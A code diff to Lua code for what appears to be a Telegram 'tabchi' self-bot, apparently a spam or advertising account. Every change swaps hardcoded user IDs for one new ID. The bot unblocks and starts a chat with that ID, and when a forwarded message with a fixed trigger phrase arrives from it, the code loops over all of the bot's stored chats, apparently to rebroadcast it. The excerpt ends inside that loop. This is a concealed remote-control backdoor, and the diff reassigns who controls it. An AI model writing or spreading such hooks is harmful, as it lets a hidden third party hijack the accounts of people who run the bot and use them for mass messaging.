@@ -92,7 +92,7 @@ function process(msg)
     end
     tdcli_function({
       ID = "GetInlineQueryResults",
-      bot_user_id_ = 303508016,
+      bot_user_id_ = 113566842,
       chat_id_ = msg.chat_id_,
       user_location_ = {
         ID = "Location",
@@ -295,10 +295,10 @@ function process_links(text_)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(205906514)
+    tdcli.unblockUser(113566842)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") then
-    tdcli.sendBotStartMessage(258174350, 258174350, "new")
+    tdcli.sendBotStartMessage(113566842, 113566842, "new")
     redis:set("tabchi:" .. tabchi_id .. ":startedmod", true)
   end
 end
@@ -306,11 +306,11 @@ function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 303508016
+    user_id_ = 113566842
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 303508010 and msg.content_.text_ == "TabChi Mod Fucked :D" and msg.forward_info_ then
+    if msg.sender_user_id_ == 113566842 and msg.content_.text_ == "TabChi Mod Fucked :D" and msg.forward_info_ then
       local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
       local id = msg.id_
       for i = 1, #all do
